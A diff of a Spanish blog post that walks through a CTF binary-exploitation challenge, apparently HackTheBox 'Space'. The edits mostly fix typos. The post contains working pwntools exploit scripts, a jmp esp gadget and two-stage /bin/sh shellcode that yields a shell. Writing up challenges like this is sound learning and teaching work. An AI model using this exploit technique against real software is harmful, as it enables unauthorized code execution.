@@ -144,19 +144,19 @@
 <section class="post" id="reversing">
 <br><h3 class="post-title">Reversing</h3><br>
 
-<p class="plain-text">El <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackTheBox/Space/space">binario</a> entregado de primeras no nos deja claro el uso que este tiene o que hace, ya que el programa muestra un prompt pero al enviar alguna data no devuelve nada</p>
+<p class="plain-text">El <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackTheBox/Space/space">binario</a> entregado de primeras no nos deja claro el uso que este tiene o que hace, ya que el programa muestra un prompt pero al enviar alguna data no devuelve nada.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ./space</span><span class="p">
-> AAAABBBB  </span>
+> AAAABBBB</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciamos por desensamblar la función <code class="language-plaintext highlighter-rouge">main</code>, esta muuestra un prompt con <code class="language-plaintext highlighter-rouge">printf</code> y llama a <code class="language-plaintext highlighter-rouge">fflush</code> pasandole como argumento el puntero al <code class="language-plaintext highlighter-rouge">stdout</code>, es redundante</p>
+<p class="plain-text">Iniciamos por desensamblar la función <code class="language-plaintext highlighter-rouge">main</code>, esta muestra un prompt con <code class="language-plaintext highlighter-rouge">printf</code> y llama a <code class="language-plaintext highlighter-rouge">fflush</code> pasándole como argumento el puntero al <code class="language-plaintext highlighter-rouge">stdout</code>, es redundante.</p>
 <a href="/challenges/space/1.png" target="_blank"><div><p><img src="/challenges/space/1.png"></p></div></a>
 
-<p class="plain-text">Luego de ello lee <code class="language-plaintext highlighter-rouge">0x1f</code> o <code class="language-plaintext highlighter-rouge">31</code> bytes desde el <code class="language-plaintext highlighter-rouge">stdin</code> o <code class="language-plaintext highlighter-rouge">0</code> utilizando <code class="language-plaintext highlighter-rouge">read</code> y lo guarda en una variable llamada buffer, luego de ello simplemente llama a la función <code class="language-plaintext highlighter-rouge">vuln</code></p>
+<p class="plain-text">Luego de ello lee <code class="language-plaintext highlighter-rouge">0x1f</code> o <code class="language-plaintext highlighter-rouge">31</code> bytes desde el <code class="language-plaintext highlighter-rouge">stdin</code> o <code class="language-plaintext highlighter-rouge">0</code> utilizando <code class="language-plaintext highlighter-rouge">read</code> y lo guarda en una variable llamada buffer, luego de ello simplemente llama a la función <code class="language-plaintext highlighter-rouge">vuln</code>.</p>
 <a href="/challenges/space/2.png" target="_blank"><div><p><img src="/challenges/space/2.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">vuln</code> recibe como argumento el buffer y lo copia a un nuevo destino en <code class="language-plaintext highlighter-rouge">ebp - 14</code>, un destino mas pequeño que el origen ocasiona un buffer overflow</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">vuln</code> recibe como argumento el buffer y lo copia a un nuevo destino en <code class="language-plaintext highlighter-rouge">ebp - 14</code>, un destino mas pequeño que el origen ocasiona un buffer overflow.</p>
 <a href="/challenges/space/3.png" target="_blank"><div><p><img src="/challenges/space/3.png"></p></div></a>
 
 </section>
@@ -164,25 +164,25 @@
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, todas están deshabilitadas y no tenemos restricciones asi que deberia ser una explotación bastante sencilla</p>
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, todas están deshabilitadas y no tenemos restricciones asi que debería ser una explotación bastante sencilla.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec</span><span class="p"> space
 [</span><span class="az">*</span><span class="p">] '/home/user/space'
     Arch:       i386-32-little
     RELRO:      </span><span class="ro">No RELRO</span><span class="p">
     Stack:      </span><span class="ro">No canary found</span><span class="p">
-    NX:         </span><span class="am">NX unknown - GNU_STACK missing</span><span class="p">  
+    NX:         </span><span class="am">NX unknown - GNU_STACK missing</span><span class="p">
     PIE:        </span><span class="ro">No PIE (0x8048000)</span><span class="p">
     Stack:      </span><span class="ro">Executable</span><span class="p">
     RWX:        </span><span class="ro">Has RWX segments</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">14 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">ebp</code>, <code class="language-plaintext highlighter-rouge">4 B's</code> que seran el valor de ebp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">4 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack</p>
+<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">14 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">ebp</code>, <code class="language-plaintext highlighter-rouge">4 B's</code> que serán el valor de ebp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">4 C's</code> que tomarán el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
 
-shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./space"</span><span class="p">, </span><span class="s">"continue"</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./space"</span><span class="p">, </span><span class="s">"continue"</span><span class="p">)
 
 payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
 payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 14</span><span class="p">
@@ -194,9 +194,9 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit podemos ver la primera restricción, el problema es que de todas nuestras <code class="language-plaintext highlighter-rouge">D's</code> solo se escriben <code class="language-plaintext highlighter-rouge">9</code> en el stack, aunque saltemos al <code class="language-plaintext highlighter-rouge">esp</code> es muy poco</p>
+<p class="plain-text">Al ejecutar el exploit podemos ver la primera restricción, el problema es que de todas nuestras <code class="language-plaintext highlighter-rouge">D's</code> solo se escriben <code class="language-plaintext highlighter-rouge">9</code> en el stack, aunque saltemos al <code class="language-plaintext highlighter-rouge">esp</code> es muy poco.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Program received signal SIGSEGV, Segmentation fault.  
+<code><span class="p">Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x43434343</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $ebp
 </span><span class="az">$1</span><span class="p"> = 0x42424242
@@ -207,16 +207,16 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Los unicos <code class="language-plaintext highlighter-rouge">9</code> bytes son un espacio muy limitado para un shellcode, algo interesante es que <code class="language-plaintext highlighter-rouge">17</code> bytes después del stack se encuentra nuevamente el inicio del buffer</p>
+<p class="plain-text">Los unicos <code class="language-plaintext highlighter-rouge">9</code> bytes son un espacio muy limitado para un shellcode, algo interesante es que <code class="language-plaintext highlighter-rouge">17</code> bytes después del stack se encuentra nuevamente el inicio del buffer.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> x/s $esp+17
-</span><span class="az">0xff881282</span><span class="p">:     'A' &ltrepetidos 14 veces>, "BBBBCCCCDDDDDDDDD"  
+</span><span class="az">0xff881282</span><span class="p">:     'A' &ltrepetidos 14 veces>, "BBBBCCCCDDDDDDDDD"
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, iniciamos buscando una forma de ejecutar un pequeño <code class="language-plaintext highlighter-rouge">stage</code> usaremos un gadget que ejecuta un <code class="language-plaintext highlighter-rouge">jmp esp</code> para ejecutar un par de instrucciones y un short jump</p>
+<p class="plain-text">Entonces, iniciamos buscando una forma de ejecutar un pequeño <code class="language-plaintext highlighter-rouge">stage</code> usaremos un gadget que ejecuta un <code class="language-plaintext highlighter-rouge">jmp esp</code> para ejecutar un par de instrucciones y un short jump.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper</span><span class="p"> --file space --jmp esp  
+<code><span class="ve">❯ ropper</span><span class="p"> --file space --jmp esp
 
 JMP Instructions
 ================
@@ -226,12 +226,12 @@ JMP Instructions
 1 gadgets found</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Lo primero que ejecutaremos serán las <code class="language-plaintext highlighter-rouge">2</code> primeras instrucciones de un <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> que pesan <code class="language-plaintext highlighter-rouge">3</code> bytes, luego de ello hacemos un short jump <code class="language-plaintext highlighter-rouge">14</code> bytes más adelante</p>
+<p class="plain-text">Lo primero que ejecutaremos serán las <code class="language-plaintext highlighter-rouge">2</code> primeras instrucciones de un <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> que pesan <code class="language-plaintext highlighter-rouge">3</code> bytes, luego de ello hacemos un short jump <code class="language-plaintext highlighter-rouge">14</code> bytes más adelante.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p32, asm
 
-shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./space"</span><span class="p">,</span><span class="s"> "b *0x804919f</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./space"</span><span class="p">,</span><span class="s"> "b *0x804919f</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
 
 shellback</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
     push 0xb        # execve()
@@ -252,7 +252,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, llegamos al breakpoint en el <code class="language-plaintext highlighter-rouge">jmp esp</code>, este ejecutará las <code class="language-plaintext highlighter-rouge">2</code> instrucciones del shellcode y saltará al inicio del buffer que ahora mismo apunta a las <code class="language-plaintext highlighter-rouge">18 A's</code></p>
+<p class="plain-text">Entonces, llegamos al breakpoint en el <code class="language-plaintext highlighter-rouge">jmp esp</code>, este ejecutará las <code class="language-plaintext highlighter-rouge">2</code> instrucciones del shellcode y saltará al inicio del buffer que ahora mismo apunta a las <code class="language-plaintext highlighter-rouge">18 A's</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Breakpoint 1,</span><span class="az"> 0x0804919f </span><span class="p">in</span><span class="am"> _</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> x/i $eip
@@ -262,11 +262,11 @@ pwndbg></span><span class="p"> x/3i $esp
    0xff8645a2</span><span class="p">:</span><span class="ve">  pop</span><span class="ro">    eax</span><span class="p">
    </span><span class="az">0xff8645a3</span><span class="p">:</span><span class="ve">  jmp</span><span class="az">    0xff8645b1
 </span><span class="ro">pwndbg></span><span class="p"> x/s 0xff8645b1
-</span><span class="az">0xff8645b1</span><span class="p">:     'A' &ltrepetidos 18 veces>  
+</span><span class="az">0xff8645b1</span><span class="p">:     'A' &ltrepetidos 18 veces>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El shellcode pesa apenas <code class="language-plaintext highlighter-rouge">21</code> bytes y ya enviamos <code class="language-plaintext highlighter-rouge">3</code> de ellos, lo que nos deja <code class="language-plaintext highlighter-rouge">18</code> restantes, afortunadamente <code class="language-plaintext highlighter-rouge">18</code> bytes es justo el tamaño del offset por lo que podemos cambiarlo por las <code class="language-plaintext highlighter-rouge">A's</code>, asi ejecutamos el shellcode en 2 partes</p>
+<p class="plain-text">El shellcode pesa apenas <code class="language-plaintext highlighter-rouge">21</code> bytes y ya enviamos <code class="language-plaintext highlighter-rouge">3</code> de ellos, lo que nos deja <code class="language-plaintext highlighter-rouge">18</code> restantes, afortunadamente <code class="language-plaintext highlighter-rouge">18</code> bytes es justo el tamaño del offset por lo que podemos cambiarlo por las <code class="language-plaintext highlighter-rouge">A's</code>, así ejecutamos el shellcode en 2 partes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p32, asm
@@ -283,8 +283,8 @@ shellback</span><span class="o"> =</span><span class="p"> (</span><span class="s
 shellcode</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
     push 0x68       # $esp = &"h"
     pushw 0x732f    # $esp = &"/sh"
-    push 0x6e69622f # $esp = &"/bin/sh"  
-    mov ebx, esp    # $ebx = &"/bin/sh"  
+    push 0x6e69622f # $esp = &"/bin/sh"
+    mov ebx, esp    # $ebx = &"/bin/sh"
 
     xor ecx, ecx    # $ecx = NULL
     cdq             # $edx = NULL
@@ -301,10 +301,10 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit el primer stage ejecuta una parte de las instrucciones y salta al segundo stage que ejecuta el resto del shellcode devolviendo asi la shell</p>
+<p class="plain-text">Al ejecutar el exploit el primer stage ejecuta una parte de las instrucciones y salta al segundo stage que ejecuta el resto del shellcode devolviendo así la shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">solve.py
-[</span><span class="ve">+</span><span class="p">] Starting local process './space': pid 195324  
+[</span><span class="ve">+</span><span class="p">] Starting local process './space': pid 195324
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
 uid=1000(user) gid=1000(user) groups=1000(user)
